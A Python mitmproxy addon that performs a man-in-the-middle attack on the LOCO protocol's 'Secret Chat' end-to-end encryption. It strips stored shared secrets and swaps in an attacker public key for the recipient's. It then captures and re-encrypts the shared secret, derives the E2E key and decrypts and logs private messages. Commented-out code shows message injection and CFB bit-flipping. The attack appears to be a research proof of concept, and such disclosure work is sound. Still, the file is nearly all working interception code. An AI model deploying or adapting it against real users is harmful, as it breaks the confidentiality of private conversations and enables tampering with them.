import base64
import logging

from lib.crypto_utils import get_rsa_key_pair
from lib.loco_parser import LocoParser
from mitmproxy import connection, tcp, tls
from mitmproxy.utils import human, strutils


class LocoMitm:
    def __init__(self, rsa_key_pair, master_secret=None) -> None:
        self.parser = LocoParser()
        self.rsa_key_pair = rsa_key_pair
        self.recipient_user_id = 0
        self.recipient_public_key = b""
        self.shared_secret = b""
        self.master_secret = master_secret
        self.e2e_encryption_key = None

    @staticmethod
    def get_addr(server: connection.Server):
        return server.peername or server.address

    def tls_clienthello(self, data: tls.ClientHelloData):
        server_address = self.get_addr(data.context.server)
        logging.info("Skip TLS intercept for %s.", human.format_address(server_address))
        data.ignore_connection = True

    def compute_e2e_encryption_key(self, shared_secret):
        if not self.e2e_encryption_key:
            logging.info(
                "Computing E2E encryption key with shared secret: %s", shared_secret
            )
            self.e2e_encryption_key = self.parser.get_e2e_encryption_key(shared_secret)
        else:
            logging.info(
                "E2E encryption key: %s", base64.b64encode(self.e2e_encryption_key)
            )

    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]
        self.parser.parse(message.content)

        if self.parser.loco_packet:
            logging.info(
                "from_client=%s, content=%s",
                message.from_client,
                self.parser.loco_packet.get_packet_as_dict(),
            )

        # If there's already a shared secret stored on the server remove it from the LOCO packet
        if (
            not message.from_client
            and self.parser.loco_packet
            and self.parser.loco_packet.loco_command in {"SCREATE", "CHATONROOM"}
        ):
            if isinstance(self.parser.loco_packet.body_payload, bytes):
                logging.error(
                    "Dropping %s packet as we cannot decode the packet body.",
                    self.parser.loco_packet.loco_command,
                )
                message.content = b""
                return

            tampered_packet = self.parser.remove_stored_shared_secret(
                self.recipient_user_id
            )
            if tampered_packet:
                message.content = tampered_packet

        # Get recipient's public key and replace it with our MITM public key
        if (
            not self.master_secret
            and self.parser.loco_packet
            and not message.from_client
            and self.parser.loco_packet.loco_command
            in {"GETPK", "GETLPK", "SCREATE", "CHATONROOM"}
        ):
            logging.info("Trying to parse recipient's public key from LOCO packet...")
            (
                self.recipient_public_key,
                self.recipient_user_id,
                tampered_packet,
            ) = self.parser.inject_public_key(self.rsa_key_pair)

            if (
                not self.recipient_public_key
                or not self.recipient_user_id
                or not tampered_packet
            ):
                logging.error(
                    "Could not inject MITM public key into %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return

            message.content = tampered_packet
            logging.info("Injecting MITM public key...")
            # logging.info("Tampered packet: %s", self.parser.loco_packet.get_packet_as_dict())

        # Grab the shared secret which is used to compute the E2E encryption key
        if (
            self.recipient_public_key
            and not self.master_secret
            and self.parser.loco_packet
            and message.from_client
            and self.parser.loco_packet.loco_command == "SETSK"
        ):
            logging.info("Trying to parse shared secret from LOCO packet...")

            self.shared_secret = self.parser.get_shared_secret(self.rsa_key_pair)

            if not self.shared_secret:
                logging.error("Couldn't parse shared secret from LOCO packet.")
                # TODO: remove
                logging.info("Dropping SETSK packet...")
                message.content = b""
                return

            logging.info("Shared secret: %s", self.shared_secret)

            # Re-encrypt shared secret with the recipient's original public key
            logging.info("Trying to re-encrypt shared secret...")

            tampered_packet = self.parser.encrypt_shared_secret(
                self.shared_secret, self.recipient_public_key
            )

            if tampered_packet:
                message.content = tampered_packet
                logging.info(
                    "Re-encrypted shared secret with recipient's original public key."
                )
                # TODO: remove
                logging.info("Dropping SETSK packet...")
                message.content = b""

        # Compute E2E encryption key
        if self.shared_secret:
            self.compute_e2e_encryption_key(self.shared_secret)

        if self.master_secret:
            self.compute_e2e_encryption_key(self.master_secret)

        # Decrypt Secret Chat end-to-end encrypted message
        if (
            self.e2e_encryption_key
            and self.parser.loco_packet
            and (
                (
                    message.from_client
                    and self.parser.loco_packet.loco_command == "SWRITE"
                )
                or (
                    not message.from_client
                    and self.parser.loco_packet.loco_command == "MSG"
                )
            )
        ):
            logging.info("Trying to decrypt E2E message...")

            if self.master_secret:
                decrypted_e2e_message = self.parser.get_decrypted_e2e_message(
                    self.e2e_encryption_key, self.master_secret
                )
            elif self.shared_secret:
                decrypted_e2e_message = self.parser.get_decrypted_e2e_message(
                    self.e2e_encryption_key, self.shared_secret
                )

            if decrypted_e2e_message:
                logging.warning(
                    "from_client=%s, content=%s",
                    message.from_client,
                    decrypted_e2e_message,
                )

        if not self.parser.loco_packet:
            logging.warning(
                "from_client=%s, raw packet bytes=%s",
                message.from_client,
                strutils.bytes_to_escaped_str(message.content),
            )

        # Inject a new message to show there are no integrity checks on the ciphertext
        # tampered_packet = parser.inject_message("foo", "bar")

        # if tampered_packet:
        #     message.content = tampered_packet

        # Flip bits of the ciphertext to show CFB malleability
        # flipped_packet = parser.flip_bits()

        # if flipped_packet:
        #     message.content = flipped_packet


# TODO: rename to 'test_secret'
master_secret = b"AAAAAAAAAAAAAAAAAAAAAA=="

addons = [LocoMitm(rsa_key_pair=get_rsa_key_pair())]
